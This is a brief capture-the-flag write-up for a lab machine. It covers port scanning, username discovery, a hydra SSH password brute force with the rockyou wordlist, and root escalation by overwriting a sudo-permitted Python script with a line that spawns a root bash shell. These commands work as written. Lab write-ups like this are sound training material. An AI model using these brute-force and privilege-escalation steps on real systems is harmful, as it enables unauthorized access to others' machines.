80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))

After going to ip:80 -------> Got usernames in comment section: root, www-data, Anonymous

And the blog belong to meliodas

users: root, www-data, Anonymous, meliodas

After using gobuster found: robots.txt ------> where t was told to use rockyou.txt

It was taking time to bruteforce all users with one txt file ----> So I tried out each name one by one , checking if luck work.

$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.82.17 ssh

---> [22][ssh] host: 10.10.82.17   login: meliodas   password: iloveyou1

Got the user.txt flag after logging in

Now to prev escalate: 

$ sudo -l

Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py


So what I did is I tried to edit the bak.py to execute "sudo /bin/bash" but to imsefficient permission, i was unable to...

So I removed it then again made a file named: bak.py --->  echo "import os; os.system('sudo /bin/bash')" > bak.py

Then,
$ sudo /usr/bin/python /home/meliodas/bak.py

To get:

root shell#
